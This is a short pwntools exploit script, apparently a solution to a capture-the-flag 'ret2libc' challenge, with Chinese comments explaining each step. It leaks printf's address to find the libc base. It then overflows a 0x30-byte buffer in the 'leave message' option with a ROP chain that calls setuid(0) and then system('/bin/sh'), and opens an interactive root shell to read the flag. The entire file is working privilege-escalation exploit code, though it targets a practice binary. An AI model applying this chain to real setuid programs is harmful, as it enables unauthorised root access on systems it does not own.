from pwn import *
# set 
context(arch="amd64", os="linux", log_level="debug")
# excute
challenge_path = "/challenge/ret2libc_1"
elf = ELF(challenge_path)
p = process(challenge_path)
libc= ELF('/lib/x86_64-linux-gnu/libc.so.6')
# bin_sh = 0x00000000001b45bd

#泄漏printf地址，注意printf是libc中的函数，所以泄露的offset其实是libc基地址，所以不能跳转到源程序的地址，因为源程序的基地址和libc不同且未知
p.sendafter("Choice >> ","5\n")
#计算偏移地址
p.recvline()
p.recvline()
result=p.recvline()
print_addr=int(result[24:],16)
offset=print_addr-libc.sym['printf']
print("OFFSETADDR IS:",hex(offset))
# ROPgadget --binary libc.so.6 --string '/bin/sh'
bin_sh = next(libc.search("/bin/sh"))
# ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" | grep "rdi"
pop_rdi_ret_addr = 0x23b6a + offset

# 继续布置新的栈帧
bin_sh_addr = offset + bin_sh
system_addr = offset + libc.sym['system']
setuid_addr = offset + libc.sym['setuid']
payload2 = 6*p64(0) + p64(0) 
payload2 += p64(pop_rdi_ret_addr)
payload2 += p64(0)
payload2 += p64(setuid_addr)
payload2 += p64(pop_rdi_ret_addr)
payload2 += p64(bin_sh_addr)
payload2 += p64(system_addr)
p.sendafter("Choice >> ","3\n")
p.sendafter("Input your message:\n",payload2)
# 注意获得shell之后需要进入交互模式，用改了权限的shell读取flag，不然程序终止修改失效
p.interactive()
# python3 /home/hacker/rop4.py
# leave_message中buf大小30h，但是最多可读入100h，直接控制